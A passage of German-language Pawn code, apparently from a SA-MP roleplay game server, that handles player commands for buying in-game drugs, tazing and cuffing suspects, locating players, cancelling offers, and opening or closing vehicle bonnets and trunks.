				    return 1;
				}
				if(level >= 0 && level <= 50)
				{
				    if(PlayerInfo[playerid][pDrugs] + ammount > 6)
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nicht mehr als 6 Gramm Drogen mit dir tragen!");
				        return 1;
					}
				}
				else if(level >= 51 && level <= 100)
				{
				    if(PlayerInfo[playerid][pDrugs] + ammount > 12)
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nicht mehr als 12 Gramm Drogen mit dir tragen!");
				        return 1;
					}
				}
				else if(level >= 101 && level <= 200)
				{
				    if(PlayerInfo[playerid][pDrugs] + ammount > 20)
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nicht mehr als 20 Gramm Drogen mit dir tragen!");
				        return 1;
					}
				}
				else if(level >= 201 && level <= 400)
				{
				    if(PlayerInfo[playerid][pDrugs] + ammount > 30)
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nicht mehr als 30 Gramm Drogen mit dir tragen!");
				        return 1;
					}
				}
				else if(level >= 401)
				{
				    if(PlayerInfo[playerid][pDrugs] + ammount > 99)
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nicht mehr als 99 Gramm Drogen mit dir tragen!");
				        return 1;
					}
				}
				if (PlayerInfo[playerid][pJob] == 4 && IsPlayerInRangeOfPoint(playerid,3.0, -85.4636,2.1646,3.1172))
				{
				    price = ammount * tel;
				    if(GetPlayerMoneySave(playerid) >= price)
				    {
				        format(string, sizeof(string), "* Du hast %d Gramm Drogen für $%d erworben.", ammount, price);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        GivePlayerMoneySave(playerid, -price);
						PlayerInfo[playerid][pDrugs] = ammount;
						FarmerDrogen -= ammount;
				    }
				    else
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Du kannst die Drogen nicht anfordern !");
				        return 1;
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Drogendealer oder nicht im Crack Haus!");
		            SetPlayerCheckpoint(playerid,-85.4636,2.1646,3.1172,8.0);
		            SendClientMessage(playerid, COLOR_ORANGE, "Marker gesetzt! Begebe dich zur Roten Markierung auf der Karte!");
		            SendClientMessage(playerid, COLOR_ORANGE, "Du kannst den Marker ausschalten mit /dc!");
				    return 1;
				}
			}
			else { return 1; }
		}
		return 1;
	}

	if(strcmp(cmd, "/tazer", true) ==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(gTeam[playerid] == 2 || IsACop(playerid) || PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 7)
			{
			    if(IsPlayerInAnyVehicle(playerid))
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   In einem Auto kann der Befehl nicht benutzt werden!");
			        return 1;
			    }
			    new suspect = GetClosestPlayer(playerid);
			    if(IsPlayerConnected(suspect))
				{
				    if(PlayerCuffed[suspect] > 0)
				    {
				        SendClientMessage(playerid, COLOR_GREY, "   Spieler ist schon gefesselt !");
				        return 1;
				    }
				    if(GetDistanceBetweenPlayers(playerid,suspect) < 5)
					{
					    if(gTeam[suspect] == 2)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Du kannst keinen Beamten Tazern! !");
					        return 1;
					    }
					    if(IsPlayerInAnyVehicle(suspect))
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Der Betroffene ist in einem Fahrzeug !");
					        return 1;
					    }
					    if(TazerBereit[playerid] == 0)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Dein Tazer ist noch nicht aufgeladen! (ca. 30 Sekunden)");
					        return 1;
					    }
						if(random(3) == 0)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Du hast ihn nicht getroffen!");
					        return 1;
					    }
					    GetPlayerName(suspect, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "* %s hat dich mit einem Stromschocker niedergestreckt.", sendername);
						SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "Du hast %s mit einem Stromschocker niedergestreckt.", giveplayer);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* %s holt seinen Stromschocker raus und streckt %s nieder.", sendername ,giveplayer);
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						GameTextForPlayer(suspect, "~r~Geschockt", 2500, 3);
						LoopingAnim(suspect, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
						FreezePlayer(suspect);
						PlayerCuffed[suspect] = 1;
						PlayerCuffedTime[suspect] = 20 + random(10);
						TazerBereit[playerid] = 0;
						SetTimerEx("TazerBereitForPlayer",30000,0,"i",playerid);
		            }
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist nicht in deiner Nähe!");
					    return 1;
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Beamter !");
			}
		}//not connected
	    return 1;
	}
	if(strcmp(cmd, "/cuff", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(gTeam[playerid] == 2 || IsACop(playerid))
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "FEHLER: /cuff [playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
			    if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if(gTeam[giveplayerid] == 2 || IsACop(giveplayerid))
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Du kannst keine Polizisten fesseln !");
					        return 1;
				        }
					    if(PlayerCuffed[giveplayerid] > 0)
					    {
					        SendClientMessage(playerid, COLOR_GREY, "   Spieler ist schon gefesselt !");
					        return 1;
					    }
						if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    new car = GetPlayerVehicleID(playerid);
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selber fesseln!"); return 1; }
						    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(giveplayerid, car))
						    {
						        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
						        format(string, sizeof(string), "* Dir wurden von %s Handschellen angelegt.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du hast %s Handschellen angelegt.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* %s hat %s Handschellen angelegt.", sendername ,giveplayer);
								ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
								GameTextForPlayer(giveplayerid, "~r~In Handschellen", 2500, 3);
								FreezePlayer(giveplayerid);
								PlayerCuffed[giveplayerid] = 2;
								PlayerCuffedTime[giveplayerid] = 600;
								KillTimer(hacken[giveplayerid]);
						    }
						    else
						    {
						        SendClientMessage(playerid, COLOR_GREY, "Spieler ist nicht in deinem Auto, oder du bist nicht in einem Auto!");
						        return 1;
						    }
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner nähe!");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Dieser Spieler ist Offline!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Polizist !");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/uncuff", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(gTeam[playerid] == 2 || IsACop(playerid))
			{
			    tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_WHITE, "FEHLER: /uncuff [playerid]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
					if(giveplayerid != INVALID_PLAYER_ID)
					{
					    if (ProxDetectorS(8.0, playerid, giveplayerid))
						{
						    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du hast dich selbst entfesselt!"); return 1; }
							if(PlayerCuffed[giveplayerid])
							{
							    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
								GetPlayerName(playerid, sendername, sizeof(sendername));
							    format(string, sizeof(string), "* Du wurdest von %s entfesselt.", sendername);
								SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
								format(string, sizeof(string), "* Du entfesselst %s.", giveplayer);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(giveplayerid, "~g~Entfesselt", 2500, 3);
								UnFreezePlayer(giveplayerid);
								PlayerCuffed[giveplayerid] = 0;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht gefesselt!");
							    return 1;
							}
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe !");
						    return 1;
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Polizist !");
			}
		}//not connected
		return 1;
	}
	if(strcmp(cmd, "/showpos", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			new gesuchter;
		    if(PlayerInfo[playerid][pJob] !=1)
		    {
				SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Dedektiv !");
				return 1;
		    }
			if(UsedFind[playerid] != 0 && PlayerInfo[playerid][pDetSkill] < 401)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du hast schon nach jemanden gesucht, daher musst du noch 2 Minuten warten!");
			    return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /showpos [Spieler ID] [Person]");
				return 1;
			}
			//giveplayerid = strval(tmp);
	        giveplayerid = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /showpos [Spieler ID] [Person]");
				return 1;
			}
			gesuchter = strval(tmp);
			if (IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
					if (ProxDetectorS(5.0, playerid, giveplayerid))
					{
				        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst finden!"); return 1; }
				        new points;
				        new level = PlayerInfo[playerid][pDetSkill];
						if(level >= 0 && level <= 20)
						{ points = 4; }
						else if(level >= 21 && level <= 40)
						{ points = 6; }
						else if(level >= 41 && level <= 60)
						{ points = 8; }
						else if(level >= 61 && level <= 80)
						{ points = 10; }
						else if(level >= 81)
						{ points = 12; }
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						new Float:X,Float:Y,Float:Z;
						GetPlayerPos(gesuchter, X,Y,Z);
						SetPlayerCheckpoint(giveplayerid, X,Y,Z, 6);
						new string2[128],string3[128];
						format(string3, sizeof(string3), "* %s hat dir die Position von %s gezeigt.", GetName(playerid),GetName(gesuchter));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string3);
						format(string2, sizeof(string2), "* Du hast %s die Position von %s gezeigt.", GetName(giveplayerid),GetName(gesuchter));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string2);
						FindTime[giveplayerid] = 1;
						FindTimePoints[giveplayerid] = points;
						PlayerInfo[playerid][pDetSkill] ++;
						UsedFind[playerid] = 1;
						if(PlayerInfo[playerid][pDetSkill] == 20)
						{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 2.Du kannst nun Schneller Leute finden."); }
						else if(PlayerInfo[playerid][pDetSkill] == 40)
						{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 3.Du kannst nun Schneller Leute finden."); }
						else if(PlayerInfo[playerid][pDetSkill] == 60)
						{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 4.Du kannst nun Schneller Leute finden."); }
						else if(PlayerInfo[playerid][pDetSkill] == 80)
						{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 5.Du kannst nun Schneller Leute finden."); }
					}
					else
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Du musst näher an dem Spieler sein!");
					}
				}//invalid id
			}
			else
			{
				format(string, sizeof(string), "%d ist kein aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
    if(strcmp(cmd, "/find", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if(PlayerInfo[playerid][pJob] !=1)
		    {
				SendClientMessage(playerid, COLOR_GREY, "Du bist kein Dedektiv!"); // RAUSSSS
				return 1;
		    }
			if(UsedFind[playerid] != 0 && PlayerInfo[playerid][pDetSkill] <=35)
			{
			    SendClientMessage(playerid, COLOR_GREY, "Du hast schon nach jemanden gesucht, du musst noch 2 Minuten warten!");
			    return 1;
			}
		    tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /find [playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst finden!"); return 1; }
			        new points;
			        new level = PlayerInfo[playerid][pDetSkill];
						if(level >= 0 && level <= 20)
						{ points = 4; }
						else if(level >= 21 && level <= 40)
						{ points = 6; }
						else if(level >= 41 && level <= 60)
						{ points = 8; }
						else if(level >= 61 && level <= 80)
						{ points = 10; }
						else if(level >= 81)
						{ points = 12; }
				    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					new Float:X,Float:Y,Float:Z;
					GetPlayerPos(giveplayerid, X,Y,Z);
					SetPlayerCheckpoint(playerid, X,Y,Z, 6);
					FindTime[playerid] = 1;
					FindTimePoints[playerid] = points;
					PlayerInfo[playerid][pDetSkill] ++;
					UsedFind[playerid] = 1;
					if(PlayerInfo[playerid][pDetSkill] == 20)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 2.Du kannst jetzt öfters Leute finden."); }
					else if(PlayerInfo[playerid][pDetSkill] == 40)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 3.Du kannst jetzt öfters Leute finden."); }
					else if(PlayerInfo[playerid][pDetSkill] == 60)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 4.Du kannst jetzt öfters Leute finden."); }
					else if(PlayerInfo[playerid][pDetSkill] == 80)
					{ SendClientMessage(playerid, COLOR_YELLOW, "* Dedektiv Skill ist nun auf 5.Du kannst jetzt öfters Leute finden."); }
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Falsche ID !");
			}
		}
	    return 1;
	}
	if(strcmp(cmd,"/cancel",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_WHITE, "|__________________ Cancel __________________|");
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /cancel [name]");
				SendClientMessage(playerid, COLOR_GREY, "Benutze: Sex, Drugs, Repair, Bodyguard, Live, Refill, Car, Boxing ,Kippe");
				SendClientMessage(playerid, COLOR_GREY, "Benutze: Taxi, Bus, Medic, Mechanic, Paper, Ticket, Witness, Marriage, Divorce, Anwalt");
				SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
				return 1;
			}
			if(strcmp(x_job,"sex",true) == 0) {	SexOffer[playerid] = 999; SexPrice[playerid] = 0; }
			else if(strcmp(x_job,"drugs",true) == 0) { DrugOffer[playerid] = 999; DrugPrice[playerid] = 0; DrugGram[playerid] = 0; }
			else if(strcmp(x_job,"repair",true) == 0) {	RepairOffer[playerid] = 999; RepairPrice[playerid] = 0; RepairCar[playerid] = 0; }
			else if(strcmp(x_job,"bodyguard",true) == 0) { GuardOffer[playerid] = 999; GuardPrice[playerid] = 0; }
			else if(strcmp(x_job,"live",true) == 0) { LiveOffer[playerid] = 999; }
			else if(strcmp(x_job,"refill",true) == 0) { RefillOffer[playerid] = 999; RefillPrice[playerid] = 0; }
			else if(strcmp(x_job,"car",true) == 0) { CarOffer[playerid] = 999; CarPrice[playerid] = 0; CarID[playerid] = 0; }
			else if(strcmp(x_job,"boxing",true) == 0) { BoxOffer[playerid] = 999; }
			else if(strcmp(x_job,"paper",true) == 0) { PaperOffer[playerid] = 999; }
			else if(strcmp(x_job,"witness",true) == 0) { MarryWitnessOffer[playerid] = 999; }
			else if(strcmp(x_job,"marriage",true) == 0) { ProposeOffer[playerid] = 999; }
			else if(strcmp(x_job,"kippe",true) == 0) { ZigOffer[playerid] = 999; }
			else if(strcmp(x_job,"divorce",true) == 0) { DivorceOffer[playerid] = 999; }
			else if(strcmp(x_job,"ticket",true) == 0) { TicketOffer[playerid] = 999; TicketMoney[playerid] = 0; }
			else if(strcmp(x_job,"medic",true) == 0) { if(IsPlayerConnected(MedicCall)) { if(MedicCall == playerid) { MedicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   You are not the current Caller !"); return 1; } } }
           	else if(strcmp(x_job,"SAPD",true) == 0) { if(IsPlayerConnected(CopCall)) { if(CopCall == playerid) { CopCall = 999;} else { SendClientMessage(playerid,COLOR_GREY, " You Are not the current Caller ! "); return 1; }}}
		//	else if(strcmp(x_job,"mechanic",true) == 0) { if(IsPlayerConnected(MechanicCall)) { if(MechanicCall == playerid) { MechanicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   You are not the current Caller !"); return 1; } } }
			else if(strcmp(x_job,"anwalt",true) == 0) { WantLawyer[playerid] = 0; CallLawyer[playerid] = 0; }
			else if(strcmp(x_job,"taxi",true) == 0)
			{
			    if(TaxiCall < 999)
			    {
			        if(TransportDuty[playerid] == 1 && TaxiCallTime[playerid] > 0)
			        {
			            TaxiAccepted[playerid] = 999;
						GameTextForPlayer(playerid, "~w~Auftrag~n~~r~aufgebrochen", 5000, 1);
						TaxiCallTime[playerid] = 0;
						DisablePlayerCheckpoint(playerid);
						TaxiCall = 999;
			        }
			        else
			        {
						if(IsPlayerConnected(TaxiCall)) { if(TaxiCall == playerid) { TaxiCall = 999; } }
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
						    if(IsPlayerConnected(i))
						    {
						        if(TaxiAccepted[i] < 999)
						        {
							        if(TaxiAccepted[i] == playerid)
							        {
							            TaxiAccepted[i] = 999;
							            GameTextForPlayer(i, "~w~Auftrag~n~~r~wurde abgebrochen", 5000, 1);
							            TaxiCallTime[i] = 0;
							            DisablePlayerCheckpoint(i);
							        }
						        }
						    }
						}
					}
				}
			}
			else if(strcmp(x_job,"bus",true) == 0)
			{
			    if(BusCall < 999)
			    {
			        if(TransportDuty[playerid] == 2 && BusCallTime[playerid] > 0)
			        {
			            BusAccepted[playerid] = 999;
						GameTextForPlayer(playerid, "~w~Auftrag~n~~r~abgebrochen", 5000, 1);
						BusCallTime[playerid] = 0;
						DisablePlayerCheckpoint(playerid);
						BusCall = 999;
			        }
			        else
			        {
						if(IsPlayerConnected(BusCall)) { if(BusCall == playerid) { BusCall = 999; } }
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
						    if(IsPlayerConnected(i))
						    {
						        if(BusAccepted[i] < 999)
						        {
							        if(BusAccepted[i] == playerid)
							        {
							            BusAccepted[i] = 999;
							            GameTextForPlayer(i, "~w~Auftrag~n~~r~abgebrochen", 5000, 1);
							            BusCallTime[i] = 0;
							            DisablePlayerCheckpoint(i);
							        }
						        }
						    }
						}
					}
				}
			}
			else { return 1; }
			format(string, sizeof(string), "* Abgebrochen: %s.", x_job);
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}//not connected
		return 1;
	}














	if(strcmp(cmd,"/bonnet",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_GREY, "[Benutzung]: /bonnet [open/close]");
				return 1;
			}
		   	if(strcmp(x_job,"close",true) == 0)
		   	{
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);




									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keine Motorhaube!");
								    return 1;
									}




								if(carowner == playerid)// Privatfahrzeug
						   		{
	                                format(string, sizeof(string), "* %s Schliesst die Motorhaube (%s)",GetName(playerid),CarName[PlayerCar[carowner][slot][CarModel]-400]);
	                     			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									new engine, lights, alarm, doors, bonnet, boot, objective;
									GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									SetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, VEHICLE_PARAMS_OFF, boot, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben die Motorhaube Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
		   	return 1;
			}
		   	if(strcmp(x_job,"open",true) == 0)
		   	{

		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keine Motorhaube!");
								    return 1;
									}




								if(carowner == playerid)// Privatfahrzeug
						   		{
			                        format(string, sizeof(string), "* %s Öffnet die Motorhaube (%s)",GetName(carowner),CarName[PlayerCar[carowner][slot][CarModel]-400]);
			                     	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									new engine, lights, alarm, doors, bonnet, boot, objective;
									GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									SetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, VEHICLE_PARAMS_ON, boot, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben die Motorhaube Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
			   	return 1;
			}





		}
		return 1;
	}




	if(strcmp(cmd,"/trunk",true)==0)
    {
        if(IsPlayerConnected(playerid))
	    {
			new x_job[256];
			x_job = strtoknew(cmdtext, idx);
			if(!strlen(x_job)) {
				SendClientMessage(playerid, COLOR_GREY, "[Benutzung]: /trunk [open/close/check/clear/put/take] [mats/drugs/deagle/shotgun/mp5/ak47/m4/rifle/sniper] [Anzahl]");
				return 1;
			}
		   	if(strcmp(x_job,"close",true) == 0)
		   	{
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);




									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




								if(carowner == playerid)// Privatfahrzeug
						   		{
	                                format(string, sizeof(string), "* %s Schliesst den Kofferaum (%s)",GetName(playerid),CarName[PlayerCar[carowner][slot][CarModel]-400]);
	                     			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									new engine, lights, alarm, doors, bonnet, boot, objective;
									GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									SetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, VEHICLE_PARAMS_OFF, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
		   	return 1;
			}
		   	if(strcmp(x_job,"open",true) == 0)
		   	{

		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(IsADtCar(kvid))// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);

									if(IsAPlane(PlayerCar[carowner][slot][CarId])|| IsABoat(PlayerCar[carowner][slot][CarId]) ||IsABike(PlayerCar[carowner][slot][CarId]) ||IsARoller(PlayerCar[carowner][slot][CarId]))
							        {
									SCM(playerid,COLOR_GRAD2,"Dieses Fahrzeug hat keinen Kofferaum!");
								    return 1;
									}




								if(carowner == playerid)// Privatfahrzeug
						   		{
			                        format(string, sizeof(string), "* %s Öffnet den Kofferaum (%s)",GetName(carowner),CarName[PlayerCar[carowner][slot][CarModel]-400]);
			                     	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
									new engine, lights, alarm, doors, bonnet, boot, objective;
									GetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, boot, objective);
									SetVehicleParamsEx(PlayerCar[carowner][slot][CarId], engine, lights, alarm, doors, bonnet, VEHICLE_PARAMS_ON, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
								}
								else
						   		{
								SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Schlüssel für dieses Fahrzeug!");
								return 1;
								}
							}
							else
						   	{
							SendClientMessage(playerid, COLOR_GREY, "Fraktionsfahrzeuge haben den Kofferaum Reserviert!");
							return 1;
							}
						}
					}
					if(!Found)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Kein Fahrzeug in der Nähe!");
					}
			   	return 1;
			}
